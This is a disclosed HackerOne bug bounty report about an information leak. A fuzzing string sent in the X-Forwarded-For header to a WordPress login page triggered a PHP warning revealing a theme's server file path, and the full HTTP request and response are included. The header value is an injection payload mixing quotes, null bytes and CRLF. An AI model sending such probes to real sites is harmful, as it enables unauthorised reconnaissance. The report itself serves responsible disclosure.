---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '148963'
original_report_id: '148963'
title: Application error message
weakness: Information Disclosure
team_handle: radancy
created_at: '2016-07-03T07:03:48.551Z'
disclosed_at: '2017-03-31T02:17:52.689Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 3
tags:
- hackerone
- information-disclosure
---

# Application error message

## Metadata

- HackerOne Report ID: 148963
- Weakness: Information Disclosure
- Program: radancy
- Disclosed At: 2017-03-31T02:17:52.689Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Attack details
HTTP Header input X-Forwarded-For was set to 12345'"\'\");|]*%00{%0d%0a<%00>%bf%27'???#
Error message found: 
<b>Warning</b>:  inet_pton() [<a href='function.inet-pton'>function.inet-pton</a>]: Unrecognized address 12345\'\&quot;\\\'\\\&quot;);|]*%00{%0d%0a&lt;%00&gt;%bf%27\'#### in <b>/home/socialrecruitmentmonitor.com/www/wp-content/themes/MaxCommunique/functions.php</b> on line <b>185</b><br />

Request
GET /wp-login.php HTTP/1.1
Referer: http://www.google.com/search?hl=en&q=testing
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.94 Safari/537.36
Client-IP: 127.0.0.1
X-Forwarded-For: 12345'"\'\");|]*%00{%0d%0a<%00>%bf%27'####
X-Forwarded-Host: localhost
Accept-Language: en
Via: 1.1 wa.www.test.com
Origin: http://www.test.com/
Cookie: qtrans_cookie_test=qTranslate+Cookie+Test; PHPSESSID=7b368d6600e0413751e1483eb50288fb; wordpress_test_cookie=WP+Cookie+check
Host: login.socialrecruitmentmonitor.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
Accept: */*

Response
HTTP/1.1 200 OK
Server: Apache
Set-Cookie: qtrans_cookie_test=qTranslate+Cookie+Test; path=/; domain=login.socialrecruitmentmonitor.com
Expires: Wed, 11 Jan 1984 05:00:00 GMT
Cache-Control: no-cache, must-revalidate, max-age=0
Pragma: no-cache
Set-Cookie: wordpress_test_cookie=WP+Cookie+check; path=/
X-Frame-Options: SAMEORIGIN
Vary: Accept-Encoding
Content-Type: text/html; charset=UTF-8
Content-Length: 2722
Accept-Ranges: bytes
Date: Sun, 03 Jul 2016 07:00:19 GMT
X-Varnish: 1812704148
Age: 0
Via: 1.1 varnish
Connection: keep-alive
Original-Content-Encoding: gzip

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
